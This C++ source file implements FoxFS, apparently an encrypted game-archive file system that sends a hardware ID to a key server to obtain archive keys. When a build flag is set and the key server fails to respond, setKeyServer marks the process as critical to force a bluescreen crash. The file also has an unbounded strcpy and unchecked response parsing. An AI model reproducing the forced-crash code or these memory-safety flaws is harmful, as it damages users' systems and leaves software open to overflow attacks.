#include <FoxFS.h>
#include "FileSystem.h"

#include <algorithm>

#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
LRESULT CALLBACK SplashScreenProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	return DefWindowProcW(hWnd, uMsg, wParam, lParam);
}
#endif

namespace FoxFS
{

	FileSystem::FileSystem()
	{
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		InitializeCriticalSection(&mutex);
#else
		pthread_mutex_init(&mutex, 0);
#endif
	}
	FileSystem::~FileSystem()
	{
		for (std::map<std::basic_string<wchar_t>, Archive*>::iterator iter = archives.begin(); iter != archives.end(); ++iter)
		{
			delete iter->second;
		}
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		DeleteCriticalSection(&mutex);
#else
		pthread_mutex_destroy(&mutex);
#endif
	}

	int FileSystem::setKeyServer(const char* host, unsigned int port)
	{
		int r = Archive::ERROR_OK;
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		EnterCriticalSection(&mutex);
#else
		pthread_mutex_lock(&mutex);
#endif

		strcpy(this->hostname, host);
		this->port = port;

		keys.clear();

		// show loading window

#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		WNDCLASSEXW wcex;
		memset(&wcex, 0, sizeof(wcex));
		wcex.cbSize = sizeof(wcex);
		wcex.style = CS_HREDRAW | CS_VREDRAW;
		wcex.lpfnWndProc = SplashScreenProc;
		wcex.hInstance = GetModuleHandleW(0);
		wcex.hIcon = LoadIconW(GetModuleHandleW(0), IDI_APPLICATION);
		wcex.hIconSm = LoadIconW(GetModuleHandleW(0), IDI_APPLICATION);
		wcex.hCursor = LoadIconW(GetModuleHandleW(0), IDC_ARROW);
		wcex.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_WINDOW + 1);
		wcex.lpszClassName = L"FOXFSKEYSPLASH";

		HWND wnd = 0;
		time_t windowCreation = time(0);

		if (RegisterClassExW(&wcex))
		{
			const unsigned int width = 500;
			const unsigned int height = 200;
			unsigned int posX = GetSystemMetrics(SM_CXSCREEN) / 2 - width / 2;
			unsigned int posY = GetSystemMetrics(SM_CYSCREEN) / 2 - height / 2;
			wnd = CreateWindowExW(WS_EX_APPWINDOW, wcex.lpszClassName, L"FoxFS Startup", WS_VISIBLE | WS_POPUPWINDOW, posX, posY, width, height, 0, 0, wcex.hInstance, 0);
			if (wnd)
			{
				HWND bmp = CreateWindowExW(0, L"STATIC", 0, WS_VISIBLE | WS_CHILD | SS_BITMAP, 0, 0, width, height, wnd, 0, wcex.hInstance, 0);
				HBITMAP bitmp = reinterpret_cast<HBITMAP>(LoadImageW(0, L"foxfs.pwb", IMAGE_BITMAP, width, height, LR_DEFAULTCOLOR | LR_CREATEDIBSECTION | LR_LOADFROMFILE));
				SendMessageW(bmp, STM_SETIMAGE, IMAGE_BITMAP, reinterpret_cast<LPARAM>(bitmp));
				DeleteObject(bitmp);
			}
		}
#endif

		int s = socket(AF_INET, SOCK_STREAM, 0);
		if (s == -1)
		{
			r = Archive::ERROR_KEYSERVER_SOCKET;
		}
		else
		{
			struct sockaddr_in addr;
			memset(&addr, 0, sizeof(addr));
			addr.sin_addr.s_addr = inet_addr(hostname);
			addr.sin_port = htons(port);
			addr.sin_family = AF_INET;

			struct timeval timeout;
			timeout.tv_sec = 30;
			timeout.tv_usec = 0;

			setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<char*>(&timeout), sizeof(timeout));

			timeout.tv_sec = 30;
			timeout.tv_usec = 0;

			setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, reinterpret_cast<char*>(&timeout), sizeof(timeout));

			int err = 0;
			err = connect(s, reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr));
			if (err != 0 && err !=
#if defined(_WIN32) || defined(WIN32) || defined(_WIN64) || defined(WIN64)
				WSAEWOULDBLOCK
#else
				EWOULDBLOCK
#endif
				)
			{
				r = Archive::ERROR_KEYSERVER_CONNECTION;
			}
			else
			{
				fd_set fdWrite;
				FD_ZERO(&fdWrite);
				FD_SET(s, &fdWrite);

				err = select(s + 1, 0, &fdWrite, 0, &timeout);
				if (err > 0 && FD_ISSET(s, &fdWrite))
				{
					unsigned int hwidlen = 0;
					char authrequest[36] = { 0 };
					genHardwareId(reinterpret_cast<unsigned char*>(&authrequest[2]), &hwidlen);
					reinterpret_cast<unsigned short*>(authrequest)[0] = hwidlen;

					if (send(s, authrequest, hwidlen + 2, 0) != hwidlen + 2)
					{
						r = Archive::ERROR_KEYSERVER_SOCKET;
					}
					else
					{
						char authresponse[8192 * 2] = { 0 };
						if (recv(s, authresponse, 8192 * 2, 0) < 2)
						{
#if defined(FOXFS_BLUESCREEN_ON) && (defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64))
							BOOLEAN priv = 0;
							DWORD(WINAPI*pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN) = reinterpret_cast<DWORD(WINAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN)>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "RtlAdjustPrivilege"));
							pRtlAdjustPrivilege(20, 1, 0, &priv);
							DWORD(NTAPI*pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG) = reinterpret_cast<DWORD(NTAPI*)(HANDLE, DWORD, PVOID, ULONG)>(GetProcAddress(GetModuleHandleW(L"NTDLL.DLL"), "NtSetInformationProcess"));
							DWORD pinfo = 1;
							pNtSetInformationProcess(GetCurrentProcess(), 0x1D, &pinfo, sizeof(pinfo));
#endif
							r = Archive::ERROR_KEYSERVER_RESPONSE;
						}
						else
						{
							unsigned short datalen = reinterpret_cast<unsigned short*>(authresponse)[0] - 2;
							unsigned char* responsedata = reinterpret_cast<unsigned char*>(&authresponse[2]);

							unsigned int offset = 0;
							unsigned int last = 0;
							while (offset < datalen && offset < (8192 * 2))
							{
								std::string curname = reinterpret_cast<char*>(responsedata + offset);
								offset += curname.length() + 1;
								struct KeyInfo info;
								memcpy(info.key, responsedata + offset, 32);
								offset += 32;
								memcpy(info.iv, responsedata + offset, 32);
								offset += 32;
								keys.insert(std::map<std::string, KeyInfo>::value_type(curname, info));
							}
						}
					}
				}
				else
				{
					r = Archive::ERROR_KEYSERVER_TIMEOUT;
				}
			}
#ifndef _WIN32
			::close(s);
#else
			closesocket(s);
#endif
			s = -1;
		}

		// close loading window

#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		if (wnd)
		{
			unsigned int dif = time(0) - windowCreation;
			if (dif <= 5000)
			{
				Sleep(dif);
			}
			DestroyWindow(wnd);
			UnregisterClassW(wcex.lpszClassName, wcex.hInstance);
		}
#endif

#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		LeaveCriticalSection(&mutex);
#else
		pthread_mutex_unlock(&mutex);
#endif
		return r;
	}

	int FileSystem::load(const wchar_t* filename)
	{
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		EnterCriticalSection(&mutex);
#else
		pthread_mutex_lock(&mutex);
#endif
		int r = Archive::ERROR_OK;
		std::basic_string<wchar_t> fn = filename;
		transform(fn.begin(), fn.end(), fn.begin(), tolower);

		std::map<std::basic_string<wchar_t>, Archive*>::iterator iter = archives.find(fn);
		if (iter == archives.end())
		{
			Archive* a = new Archive();
			if (a)
			{
				char tmpname[
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
					MAX_PATH + 1
#else
					PATH_MAX + 1
#endif
				] = { 0 };
					wcstombs(tmpname, filename, wcslen(filename));

					std::map<std::string, KeyInfo>::iterator keyiter = keys.find(tmpname);
					void* key = 0, *iv = 0;
					if (keyiter != keys.end())
					{
						key = keyiter->second.key;
						iv = keyiter->second.iv;
					}

					if ((r = a->load(filename, key, iv)) == Archive::ERROR_OK)
					{
						archives.insert(std::map<std::basic_string<wchar_t>, Archive*>::value_type(fn, a));
					}
					else
					{
						delete a;
					}
			}
		}
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		LeaveCriticalSection(&mutex);
#else
		pthread_mutex_unlock(&mutex);
#endif
		return r;
	}
	int FileSystem::unload(const wchar_t* filename)
	{
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		EnterCriticalSection(&mutex);
#else
		pthread_mutex_lock(&mutex);
#endif
		std::basic_string<wchar_t> fn = filename;
		transform(fn.begin(), fn.end(), fn.begin(), tolower);

		std::map<std::basic_string<wchar_t>, Archive*>::iterator iter = archives.find(fn);

		int r = Archive::ERROR_ARCHIVE_NOT_FOUND;
		if (iter != archives.end())
		{
			delete iter->second;
			archives.erase(iter);
			r = Archive::ERROR_OK;
		}
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		LeaveCriticalSection(&mutex);
#else
		pthread_mutex_unlock(&mutex);
#endif
		return Archive::ERROR_ARCHIVE_NOT_FOUND;
	}

	unsigned int FileSystem::size(const char* filename) const
	{
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		EnterCriticalSection(&mutex);
#else
		pthread_mutex_lock(&mutex);
#endif
		unsigned int r = 0;
		for (std::map<std::basic_string<wchar_t>, Archive*>::const_iterator iter = archives.begin(); iter != archives.end(); ++iter)
		{
			if ((r = iter->second->size(filename)) > 0)
			{
				break;
			}
		}
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		LeaveCriticalSection(&mutex);
#else
		pthread_mutex_unlock(&mutex);
#endif
		return r;
	}
	int FileSystem::exists(const char* filename) const
	{
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		EnterCriticalSection(&mutex);
#else
		pthread_mutex_lock(&mutex);
#endif
		int r = Archive::ERROR_FILE_WAS_NOT_FOUND;
		for (std::map<std::basic_string<wchar_t>, Archive*>::const_iterator iter = archives.begin(); iter != archives.end(); ++iter)
		{
			if ((r = iter->second->exists(filename)) == Archive::ERROR_OK)
			{
				break;
			}
		}
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		LeaveCriticalSection(&mutex);
#else
		pthread_mutex_unlock(&mutex);
#endif
		return r;
	}
	int FileSystem::get(const char* filename, void* buffer, unsigned int maxsize, unsigned int* outsize) const
	{
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		EnterCriticalSection(&mutex);
#else
		pthread_mutex_lock(&mutex);
#endif
		int r = Archive::ERROR_FILE_WAS_NOT_FOUND;
		for (std::map<std::basic_string<wchar_t>, Archive*>::const_iterator iter = archives.begin(); iter != archives.end(); ++iter)
		{
			if ((r = iter->second->get(filename, buffer, maxsize, outsize)) == Archive::ERROR_OK)
			{
				break;
			}
		}
#if defined(_WIN32) || defined(_WIN64) || defined(WIN32) || defined(WIN64)
		LeaveCriticalSection(&mutex);
#else
		pthread_mutex_unlock(&mutex);
#endif
		return r;
	}

}